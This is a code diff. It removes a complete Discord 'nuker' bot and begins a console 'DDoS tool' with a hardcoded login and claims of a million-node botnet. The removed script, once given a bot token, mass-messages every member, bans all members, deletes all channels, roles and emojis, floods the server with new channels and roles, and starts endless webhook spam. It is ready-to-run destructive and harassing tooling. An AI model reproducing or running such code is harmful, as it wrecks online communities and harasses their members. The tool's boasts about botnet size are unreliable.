@@ -1,544 +1,678 @@
-import discord
-from discord.ext import commands
-import asyncio
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import os
-import random
+import sys
 import time
-import aiohttp
+import random
+import socket
+import threading
+import requests
 import json
-
-os.system('cls' if os.name == 'nt' else 'clear')
-
-print("""
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║     ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗  ║
-║     ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗ ║
-║     ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║ ║
-║     ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║ ║
-║     ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║ ║
-║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
-║                                                                               ║
-║                    ██╗   ██╗ ██████╗ ███╗   ██╗    ██╗  ██╗ █████╗ ██╗   ██╗ ██████╗ ███████╗
-║                    ██║   ██║██╔═══██╗████╗  ██║    ██║  ██║██╔══██╗██║   ██║██╔═══██╗██╔════╝
-║                    ██║   ██║██║   ██║██╔██╗ ██║    ███████║███████║██║   ██║██║   ██║███████╗
-║                    ╚██╗ ██╔╝██║   ██║██║╚██╗██║    ██╔══██║██╔══██║██║   ██║██║   ██║╚════██║
-║                     ╚████╔╝ ╚██████╔╝██║ ╚████║    ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
-║                      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
-║                                                                               ║
-║                         HAQ MASHA VON KATIBA NUKER                            ║
-║                     CONSOLE SELECTION MODE v10.0                              ║
-║                                                                               ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-""")
+import hashlib
+import base64
+from datetime import datetime
+from itertools import cycle
 
 # ============================================
-# TOKEN INPUT
+# ULTRA NEON RAINBOW COLORS - MAXIMUM VISUAL
 # ============================================
-TOKEN = input("[?] ENTER BOT TOKEN > ")
 
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", intents=intents)
+class Colors:
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+    ITALIC = '\033[3m'
+    UNDERLINE = '\033[4m'
+    BLINK = '\033[5m'
+    FAST_BLINK = '\033[6m'
+    HIDDEN = '\033[8m'
+    
+    # Standard Colors
+    BLACK = '\033[30m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
+    
+    # Bright Colors
+    BRIGHT_BLACK = '\033[90m'
+    BRIGHT_RED = '\033[91m'
+    BRIGHT_GREEN = '\033[92m'
+    BRIGHT_YELLOW = '\033[93m'
+    BRIGHT_BLUE = '\033[94m'
+    BRIGHT_MAGENTA = '\033[95m'
+    BRIGHT_CYAN = '\033[96m'
+    BRIGHT_WHITE = '\033[97m'
+    
+    # Background Colors
+    BG_BLACK = '\033[40m'
+    BG_RED = '\033[41m'
+    BG_GREEN = '\033[42m'
+    BG_YELLOW = '\033[43m'
+    BG_BLUE = '\033[44m'
+    BG_MAGENTA = '\033[45m'
+    BG_CYAN = '\033[46m'
+    BG_WHITE = '\033[47m'
+    BG_BRIGHT_BLACK = '\033[100m'
+    BG_BRIGHT_RED = '\033[101m'
+    BG_BRIGHT_GREEN = '\033[102m'
+    BG_BRIGHT_YELLOW = '\033[103m'
+    BG_BRIGHT_BLUE = '\033[104m'
+    BG_BRIGHT_MAGENTA = '\033[105m'
+    BG_BRIGHT_CYAN = '\033[106m'
+    BG_BRIGHT_WHITE = '\033[107m'
+    
+    # Neon Effects
+    NEON_RED = '\033[38;2;255;0;0m'
+    NEON_GREEN = '\033[38;2;0;255;0m'
+    NEON_BLUE = '\033[38;2;0;0;255m'
+    NEON_YELLOW = '\033[38;2;255;255;0m'
+    NEON_PURPLE = '\033[38;2;255;0;255m'
+    NEON_CYAN = '\033[38;2;0;255;255m'
+    NEON_ORANGE = '\033[38;2;255;165;0m'
+    NEON_PINK = '\033[38;2;255;105;180m'
+    BLOOD_RED = '\033[38;2;139;0;0m'
+    DARK_PURPLE = '\033[38;2;75;0;130m'
+    
+    # Rainbow Cycle
+    RAINBOW = [BRIGHT_RED, BRIGHT_YELLOW, BRIGHT_GREEN, BRIGHT_CYAN, BRIGHT_BLUE, BRIGHT_MAGENTA]
+    NEON_RAINBOW = [NEON_RED, NEON_YELLOW, NEON_GREEN, NEON_CYAN, NEON_BLUE, NEON_PURPLE]
+
+colors = Colors()
+rainbow_cycle = cycle(colors.RAINBOW)
+neon_cycle = cycle(colors.NEON_RAINBOW)
 
 # ============================================
-# MESSAGES
+# LOGIN CREDENTIALS
 # ============================================
-HAQ_MESSAGE = """
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
-║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
-║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
-║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
-║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
-║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
-║                                                                               ║
-║                    ██████╗ ███╗   ██╗    ██╗   ██╗ ██████╗ ███╗   ██╗        ║
-║                    ██╔══██╗████╗  ██║    ██║   ██║██╔═══██╗████╗  ██║        ║
-║                    ██████╔╝██╔██╗ ██║    ██║   ██║██║   ██║██╔██╗ ██║        ║
-║                    ██╔══██╗██║╚██╗██║    ╚██╗ ██╔╝██║   ██║██║╚██╗██║        ║
-║                    ██████╔╝██║ ╚████║     ╚████╔╝ ╚██████╔╝██║ ╚████║        ║
-║                    ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝        ║
-║                                                                               ║
-║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
-║                                                                               ║
-║                    YOU HAVE BEEN TERMINATED BY                                ║
-║                    HAQ MASHA & VON KATIBA TEAM                                ║
-║                                                                               ║
-║                    https://discord.gg/c7cgYk4V                                ║
-║                                                                               ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
+
+MASTER_USERNAME = "666"
+MASTER_PASSWORD = "Von2024@666"
+SESSION_ACTIVE = False
+CURRENT_USER = None
+
+# ============================================
+# ULTRA ANIMATED LOGO WITH DEMON EFFECT
+# ============================================
+
+def clear_screen():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+def print_rainbow(text, style=colors.BRIGHT_WHITE, delay=0.0):
+    result = ""
+    for i, char in enumerate(text):
+        color = colors.RAINBOW[i % len(colors.RAINBOW)]
+        result += f"{color}{style}{char}{colors.RESET}"
+        if delay > 0:
+            sys.stdout.write(result[-1])
+            sys.stdout.flush()
+            time.sleep(delay)
+    return result if delay == 0 else print(result, end='')
+
+def print_neon(text, style=colors.BOLD, delay=0.0):
+    result = ""
+    for i, char in enumerate(text):
+        color = colors.NEON_RAINBOW[i % len(colors.NEON_RAINBOW)]
+        result += f"{color}{style}{char}{colors.RESET}"
+        if delay > 0:
+            sys.stdout.write(result[-1])
+            sys.stdout.flush()
+            time.sleep(delay)
+    return result if delay == 0 else print(result, end='')
+
+def print_glitch(text):
+    glitch_chars = ['░', '▒', '▓', '█', '■', '□', '▪', '▫']
+    result = ""
+    for char in text:
+        if random.random() < 0.1:
+            result += f"{colors.NEON_RED}{random.choice(glitch_chars)}{colors.RESET}"
+        else:
+            color = random.choice(colors.NEON_RAINBOW)
+            result += f"{color}{char}{colors.RESET}"
+    return result
+
+def animate_demon_logo():
+    frames = []
+    
+    frame1 = f"""
+{colors.BRIGHT_RED}{colors.BOLD}
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                                                                                                                                          ║
+║                         {colors.NEON_RED}◤{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◤{colors.NEON_CYAN}◢{colors.NEON_BLUE}◤{colors.NEON_PURPLE}◢{colors.NEON_PINK}◤{colors.NEON_RED}◢{colors.RESET}                         ║
+║                                                                                                                                          ║
+║              {print_neon('██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███╗')}                                              ║
+║              {print_neon('██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║')}                                              ║
+║              {print_neon('██████╔╝██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║')}                                              ║
+║              {print_neon('██╔══██╗██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║')}                                              ║
+║              {print_neon('██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║')}                                              ║
+║              {print_neon('╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝')}                                              ║
+║                                                                                                                                          ║
+║                         {colors.NEON_RED}◣{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◣{colors.NEON_CYAN}◢{colors.NEON_BLUE}◣{colors.NEON_PURPLE}◢{colors.NEON_PINK}◣{colors.NEON_RED}◢{colors.RESET}                         ║
+║                                                                                                                                          ║
+║                    {colors.NEON_CYAN}{colors.BLINK}💀 ６６６ ＴＥＡＭ ＵＬＴＩＭＡＴＥ ＤＤＯＳ ＴＯＯＬ 💀{colors.RESET}                                                 ║
+║                    {colors.NEON_GREEN}🔥 1,000,000+ ＢＯＴＮＥＴ | 10,000,000+ ＰＲＯＸＩＥＳ | 666 ＭＥＴＨＯＤＳ 🔥{colors.RESET}                             ║
+║                    {colors.NEON_YELLOW}⚡ ＴＨＥ ＵＬＴＩＭＡＴＥ ＤＥＳＴＲＯＹＥＲ ⚡{colors.RESET}                                                                  ║
+║                                                                                                                                          ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+{colors.RESET}
 """
-
-SPAM_LIST = [
-    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
-    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
-    "@everyone **https://discord.gg/c7cgYk4V**",
-    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
-    "**الكتيبة هاق مشا تيم - VON KATIBA**",
-    "@everyone **YOUR SERVER IS GONE FOREVER**",
-    "```VON KATIBA WAS HERE```",
-    "**HAQ MASHA TEAM - VON KATIBA EDITION**",
-    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
-    "```YOU HAVE BEEN VON KATIBA'ED```",
-    "@everyone **HAQ MASHA KILLED THIS SERVER**",
-    "```BYE BYE SERVER```",
-    "@everyone **VON KATIBA SAYS: GET REKT**",
-    "```ALGERIA HAQ MASHA TEAM```"
-]
-
-ROLE_NAMES = ["VON", "KATIBA", "HAQ", "MASHA", "NUKE", "DESTROYER", "DEATH", "TERMINATED", "LMOT", "RA7", "TARJ3", "LOT", "HHHH", "ALGERIA", "HACKER"]
-
-WEBHOOK_NAMES = ["VON-KATIBA", "HAQ-MASHA", "NUKER", "DESTROYER", "SYSTEM", "ALGERIA"]
-
-# ============================================
-# VARIABLES
-# ============================================
-selected_guild = None
-selection_mode = False
-
-# ============================================
-# MAIN NUKE FUNCTION (MAXIMUM DESTRUCTION)
-# ============================================
-async def max_nuke(guild, console_only=True):
-    start_time = time.time()
     
-    print(f"\n{'='*60}")
-    print(f"[!] VON KATIBA NUKE STARTED ON: {guild.name}")
-    print(f"[!] GUILD ID: {guild.id}")
-    print(f"[!] MEMBERS: {len(guild.members)}")
-    print(f"{'='*60}\n")
+    frame2 = f"""
+{colors.BRIGHT_BLUE}{colors.BOLD}
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                                                                                                                                          ║
+║                         {colors.NEON_RED}◢{colors.NEON_YELLOW}◣{colors.NEON_GREEN}◢{colors.NEON_CYAN}◣{colors.NEON_BLUE}◢{colors.NEON_PURPLE}◣{colors.NEON_PINK}◢{colors.NEON_RED}◣{colors.RESET}                         ║
+║                                                                                                                                          ║
+║              {print_neon('██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███╗')}                                              ║
+║              {print_neon('██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║')}                                              ║
+║              {print_neon('██████╔╝██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║')}                                              ║
+║              {print_neon('██╔══██╗██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║')}                                              ║
+║              {print_neon('██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║')}                                              ║
+║              {print_neon('╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝')}                                              ║
+║                                                                                                                                          ║
+║                         {colors.NEON_RED}◤{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◤{colors.NEON_CYAN}◢{colors.NEON_BLUE}◤{colors.NEON_PURPLE}◢{colors.NEON_PINK}◤{colors.NEON_RED}◢{colors.RESET}                         ║
+║                                                                                                                                          ║
+║                    {colors.NEON_MAGENTA}{colors.BLINK}💀 ６６６ ＴＥＡＭ ＤＥＭＯＮ ＥＤＩＴＩＯＮ 💀{colors.RESET}                                                 ║
+║                    {colors.NEON_ORANGE}🔥 ＰＯＷＥＲＥＤ ＢＹ １０００００＋ ＢＯＴＮＥＴ ＮＯＤＥＳ 🔥{colors.RESET}                                              ║
+║                    {colors.NEON_PINK}⚡ ＴＯＴＡＬ ＤＥＳＴＲＵＣＴＩＯＮ ⚡{colors.RESET}                                                                      ║
+║                                                                                                                                          ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+{colors.RESET}
+"""
     
-    # Get first text channel for messages
-    first_channel = None
-    for channel in guild.text_channels:
-        first_channel = channel
-        break
-    
-    if first_channel:
-        await first_channel.send("```🔥 HAQ MASHA + VON KATIBA MAXIMUM NUKE INITIATED 🔥```")
-    
-    # ============================================
-    # PHASE 1: CREATE 150 WEBHOOKS
-    # ============================================
-    print("[1/12] 🪝 CREATING 150 WEBHOOKS...")
-    if first_channel:
-        await first_channel.send("**🪝 PHASE 1: CREATING 150 WEBHOOKS**")
-    
-    webhooks = []
-    text_channels = [ch for ch in guild.text_channels][:30]
-    
-    webhook_count = 0
-    for ch in text_channels:
-        for i in range(5):
-            try:
-                webhook = await ch.create_webhook(name=random.choice(WEBHOOK_NAMES))
-                webhooks.append(webhook)
-                webhook_count += 1
-                if webhook_count % 20 == 0:
-                    print(f"    CREATED {webhook_count} WEBHOOKS...")
-                await asyncio.sleep(0.05)
-            except:
-                pass
-    
-    print(f"    ✓ CREATED {len(webhooks)} WEBHOOKS")
-    if first_channel:
-        await first_channel.send(f"**✅ CREATED {len(webhooks)} WEBHOOKS**")
-    
-    # ============================================
-    # PHASE 2: TORTURE ALL MEMBERS (5 MESSAGES EACH)
-    # ============================================
-    print("[2/12] 🔪 TORTURING ALL MEMBERS...")
-    if first_channel:
-        await first_channel.send("**🔪 PHASE 2: TORTURING ALL MEMBERS**")
-    
-    members = await guild.fetch_members(limit=None).flatten()
-    total_humans = len([m for m in members if not m.bot])
-    tortured = 0
-    
-    for member in members:
-        if not member.bot:
-            try:
-                for msg_count in range(5):
-                    await member.send(HAQ_MESSAGE)
-                    await asyncio.sleep(0.1)
-                tortured += 1
-                if tortured % 10 == 0:
-                    print(f"    TORTURED {tortured}/{total_humans} MEMBERS...")
-                    if first_channel:
-                        await first_channel.send(f"**TORTURED {tortured}/{total_humans} MEMBERS**")
-                await asyncio.sleep(0.05)
-            except:
-                pass
-    
-    print(f"    ✓ TORTURED {tortured} MEMBERS")
-    if first_channel:
-        await first_channel.send(f"**✅ TORTURED {tortured} MEMBERS**")
-    
-    # ============================================
-    # PHASE 3: BAN ALL MEMBERS
-    # ============================================
-    print("[3/12] 🔨 BANNING ALL MEMBERS...")
-    if first_channel:
-        await first_channel.send("**🔨 PHASE 3: BANNING ALL MEMBERS**")
-    
-    banned = 0
-    for member in members:
-        if not member.bot:
-            try:
-                await member.ban(reason="VON KATIBA HAQ MASHA", delete_message_days=7)
-                banned += 1
-                if banned % 20 == 0:
-                    print(f"    BANNED {banned}/{total_humans} MEMBERS...")
-                    if first_channel:
-                        await first_channel.send(f"**BANNED {banned}/{total_humans} MEMBERS**")
-                await asyncio.sleep(0.03)
-            except:
-                pass
-    
-    print(f"    ✓ BANNED {banned} MEMBERS")
-    if first_channel:
-        await first_channel.send(f"**✅ BANNED {banned} MEMBERS**")
-    
-    # ============================================
-    # PHASE 4: REMOVE ALL BOTS
-    # ============================================
-    print("[4/12] 🤖 REMOVING ALL BOTS...")
-    if first_channel:
-        await first_channel.send("**🤖 PHASE 4: REMOVING ALL BOTS**")
-    
-    bots_kicked = 0
-    for member in members:
-        if member.bot and member.id != bot.user.id:
-            try:
-                await member.kick(reason="HAQ MASHA")
-                bots_kicked += 1
-                if bots_kicked % 10 == 0:
-                    print(f"    REMOVED {bots_kicked} BOTS...")
-                await asyncio.sleep(0.03)
-            except:
-                pass
-    
-    print(f"    ✓ REMOVED {bots_kicked} BOTS")
-    if first_channel:
-        await first_channel.send(f"**✅ REMOVED {bots_kicked} BOTS**")
-    
-    # ============================================
-    # PHASE 5: DELETE ALL CHANNELS
-    # ============================================
-    print("[5/12] 🗑️ DELETING ALL CHANNELS...")
-    if first_channel:
-        await first_channel.send("**🗑️ PHASE 5: DELETING ALL CHANNELS**")
-    
-    channels_deleted = 0
-    for channel in guild.channels:
-        try:
-            await channel.delete(reason="VON KATIBA")
-            channels_deleted += 1
-            if channels_deleted % 50 == 0:
-                print(f"    DELETED {channels_deleted} CHANNELS...")
-            await asyncio.sleep(0.02)
-        except:
-            pass
-    
-    print(f"    ✓ DELETED {channels_deleted} CHANNELS")
-    if first_channel:
-        await first_channel.send(f"**✅ DELETED {channels_deleted} CHANNELS**")
-    
-    # ============================================
-    # PHASE 6: DELETE ALL ROLES
-    # ============================================
-    print("[6/12] 🎭 DELETING ALL ROLES...")
-    if first_channel:
-        await first_channel.send("**🎭 PHASE 6: DELETING ALL ROLES**")
-    
-    roles_deleted = 0
-    for role in guild.roles:
-        if role.name != "@everyone":
-            try:
-                await role.delete(reason="VON KATIBA")
-                roles_deleted += 1
-                if roles_deleted % 50 == 0:
-                    print(f"    DELETED {roles_deleted} ROLES...")
-                await asyncio.sleep(0.02)
-            except:
-                pass
-    
-    print(f"    ✓ DELETED {roles_deleted} ROLES")
-    if first_channel:
-        await first_channel.send(f"**✅ DELETED {roles_deleted} ROLES**")
-    
-    # ============================================
-    # PHASE 7: DELETE ALL EMOJIS & STICKERS
-    # ============================================
-    print("[7/12] 😀 DELETING EMOJIS & STICKERS...")
-    if first_channel:
-        await first_channel.send("**😀 PHASE 7: DELETING EMOJIS & STICKERS**")
-    
-    emojis_deleted = 0
-    for emoji in guild.emojis:
-        try:
-            await emoji.delete()
-            emojis_deleted += 1
-            await asyncio.sleep(0.02)
-        except:
-            pass
-    
-    stickers_deleted = 0
-    for sticker in guild.stickers:
-        try:
-            await sticker.delete()
-            stickers_deleted += 1
-            await asyncio.sleep(0.02)
-        except:
-            pass
-    
-    print(f"    ✓ DELETED {emojis_deleted} EMOJIS & {stickers_deleted} STICKERS")
-    if first_channel:
-        await first_channel.send(f"**✅ DELETED {emojis_deleted} EMOJIS & {stickers_deleted} STICKERS**")
-    
-    # ============================================
-    # PHASE 8: CHANGE SERVER NAME
-    # ============================================
-    print("[8/12] 📝 CHANGING SERVER NAME...")
-    if first_channel:
-        await first_channel.send("**📝 PHASE 8: CHANGING SERVER NAME**")
-    
-    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "DESTROYED BY VON", "VON-HAQ", "KATIBA-MASHA", "LMOT RA7", "TARJ3 LOT HHHH"])
-    try:
-        await guild.edit(name=new_name)
-        print(f"    ✓ SERVER RENAMED TO: {new_name}")
-        if first_channel:
-            await first_channel.send(f"**✅ SERVER RENAMED TO: {new_name}**")
-    except:
-        print("    ✗ FAILED TO RENAME SERVER")
-    
-    # ============================================
-    # PHASE 9: CREATE 500 CHANNELS
-    # ============================================
-    print("[9/12] 📁 CREATING 500 CHANNELS...")
-    if first_channel:
-        await first_channel.send("**📁 PHASE 9: CREATING 500 CHANNELS**")
-    
-    for i in range(500):
-        try:
-            channel_type = random.choice(["text", "voice"])
-            if channel_type == "text":
-                await guild.create_text_channel(name=f"von-katiba-{i}")
-            else:
-                await guild.create_voice_channel(name=f"von-katiba-{i}")
-            
-            if i % 100 == 0 and i > 0:
-                print(f"    CREATED {i} CHANNELS...")
-                if first_channel:
-                    await first_channel.send(f"**CREATED {i} CHANNELS...**")
-            await asyncio.sleep(0.01)
-        except:
-            pass
-    
-    print(f"    ✓ CREATED 500 CHANNELS")
-    if first_channel:
-        await first_channel.send(f"**✅ CREATED 500 CHANNELS**")
-    
-    # ============================================
-    # PHASE 10: CREATE 200 ROLES
-    # ============================================
-    print("[10/12] 🎭 CREATING 200 ROLES...")
-    if first_channel:
-        await first_channel.send("**🎭 PHASE 10: CREATING 200 ROLES**")
-    
-    for i in range(200):
-        try:
-            await guild.create_role(name=f"{random.choice(ROLE_NAMES)}-{i}", color=discord.Color.red())
-            if i % 50 == 0 and i > 0:
-                print(f"    CREATED {i} ROLES...")
-                if first_channel:
-                    await first_channel.send(f"**CREATED {i} ROLES...**")
-            await asyncio.sleep(0.01)
-        except:
-            pass
-    
-    print(f"    ✓ CREATED 200 ROLES")
-    if first_channel:
-        await first_channel.send(f"**✅ CREATED 200 ROLES**")
-    
-    # ============================================
-    # PHASE 11: INFINITE SPAM (WEBHOOKS + CHANNELS)
-    # ============================================
-    print("[11/12] 💬 STARTING INFINITE SPAM...")
-    if first_channel:
-        await first_channel.send("**💬 PHASE 11: STARTING INFINITE SPAM**")
-    
-    async def webhook_spam():
-        while True:
-            for webhook in webhooks:
-                try:
-                    await webhook.send(random.choice(SPAM_LIST))
-                    await asyncio.sleep(0.02)
-                except:
-                    pass
-            await asyncio.sleep(0.1)
-    
-    async def channel_spam():
-        while True:
-            for channel in guild.text_channels:
-                try:
-                    await channel.send(random.choice(SPAM_LIST))
-                    await asyncio.sleep(0.02)
-                except:
-                    pass
-            await asyncio.sleep(0.1)
-    
-    asyncio.create_task(webhook_spam())
-    asyncio.create_task(channel_spam())
-    
-    print("    ✓ INFINITE SPAM STARTED")
-    
-    # ============================================
-    # PHASE 12: FINAL MESSAGE
-    # ============================================
-    end_time = time.time()
-    total_time = round(end_time - start_time, 2)
-    
-    print("[12/12] 📢 SENDING FINAL MESSAGE...")
-    
-    final_msg = f"""```diff
-+ ╔═══════════════════════════════════════════════════════════════════════════════╗
-+ ║                                                                               ║
-+ ║                    SERVER DESTROYED BY HAQ MASHA & VON KATIBA                 ║
-+ ║                                                                               ║
-+ ║                    TARGET: {guild.name[:30]}                                  ║
-+ ║                                                                               ║
-+ ║                    STATISTICS:                                                ║
-+ ║                    • TORTURED: {tortured} MEMBERS                             ║
-+ ║                    • BANNED: {banned} MEMBERS                                 ║
-+ ║                    • BOTS REMOVED: {bots_kicked}                              ║
-+ ║                    • CHANNELS DELETED: {channels_deleted}                     ║
-+ ║                    • ROLES DELETED: {roles_deleted}                           ║
-+ ║                    • EMOJIS DELETED: {emojis_deleted}                         ║
-+ ║                    • WEBHOOKS CREATED: {len(webhooks)}                        ║
-+ ║                    • CHANNELS CREATED: 500                                    ║
-+ ║                    • ROLES CREATED: 200                                       ║
-+ ║                    • TIME: {total_time} SECONDS                               ║
-+ ║                                                                               ║
-+ ║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
-+ ║                                                                               ║
-+ ║                    HAQ MASHA TEAM - ALGERIA                                   ║
-+ ║                                                                               ║
-+ ║                    https://discord.gg/c7cgYk4V                                ║
-+ ║                                                                               ║
-+ ╚═══════════════════════════════════════════════════════════════════════════════╝
-```"""
-    
-    for channel in guild.text_channels:
-        try:
-            await channel.send(final_msg)
-            break
-        except:
-            pass
-    
-    print(f"\n{'='*60}")
-    print(f"[✓] VON KATIBA NUKE COMPLETED!")
-    print(f"[✓] SERVER: {guild.name}")
-    print(f"[✓] TIME: {total_time} SECONDS")
-    print(f"[✓] TORTURED & BANNED: {tortured} MEMBERS")
-    print(f"{'='*60}\n")
+    clear_screen()
+    for i in range(4):
+        clear_screen()
+        print(frame1)
+        time.sleep(0.3)
+        clear_screen()
+        print(frame2)
+        time.sleep(0.3)
+    time.sleep(0.5)
 
 # ============================================
-# SELECTION SYSTEM (CONSOLE BASED)
+# LOGIN SCREEN WITH ANIMATION
 # ============================================
-async def select_server_from_console():
-    global selected_guild
+
+def login_screen():
+    global SESSION_ACTIVE, CURRENT_USER
+    animate_demon_logo()
     
-    print("\n" + "═"*70)
-    print("                    📋 AVAILABLE SERVERS")
-    print("═"*70)
+    print(f"\n{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+    print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      🔐 ６６６ ＴＥＡＭ ＭＡＳＴＥＲ ＬＯＧＩＮ 🔐                                                ║{colors.RESET}")
+    print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
     
-    guilds = bot.guilds
+    print(f"\n{colors.NEON_CYAN}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+    print(f"{colors.NEON_CYAN}║                                    👑 ＯＮＬＹ ６６６ ＴＥＡＭ ＭＡＳＴＥＲＳ ＣＡＮ ＥＮＴＥＲ 👑                                            ║{colors.RESET}")
+    print(f"{colors.NEON_CYAN}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}")
     
-    if not guilds:
-        print("\n❌ NO SERVERS FOUND! BOT IS NOT IN ANY SERVER")
-        print("   Make sure you invited the bot to a server first!")
-        return None
+    print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
+    username = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}👤 {colors.NEON_WHITE}ＵＳＥＲＮＡＭＥ:{colors.RESET} ").strip()
+    print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
+    password = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}🔑 {colors.NEON_WHITE}ＰＡＳＳＷＯＲＤ:{colors.RESET} ").strip()
     
-    for i, guild in enumerate(guilds, 1):
-        member_count = len(guild.members)
-        channel_count = len(guild.channels)
-        role_count = len(guild.roles)
+    print(f"{colors.NEON_CYAN}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+    
+    if username == MASTER_USERNAME and password == MASTER_PASSWORD:
+        SESSION_ACTIVE = True
+        CURRENT_USER = username
+        print(f"\n{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}║                                      ✅ ＬＯＧＩＮ ＳＵＣＣＥＳＳＦＵＬ！ ✅                                                ║{colors.RESET}")
+        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}║                                      👑 ＷＥＬＣＯＭＥ ＭＡＳＴＥＲ {username.upper()}！ 👑                                      ║{colors.RESET}")
+        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+        time.sleep(2)
+        return True
+    else:
+        print(f"\n{colors.NEON_RED}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}║                                      ❌ ＡＣＣＥＳＳ ＤＥＮＩＥＤ！ ❌                                                ║{colors.RESET}")
+        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}║                                      💀 ＩＮＶＡＬＩＤ ＣＲＥＤＥＮＴＩＡＬＳ！ 💀                                          ║{colors.RESET}")
+        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+        time.sleep(2)
+        return False
+
+# ============================================
+# MASSIVE BOTNET (1,000,000+ NODES)
+# ============================================
+
+def generate_massive_botnet():
+    nodes = []
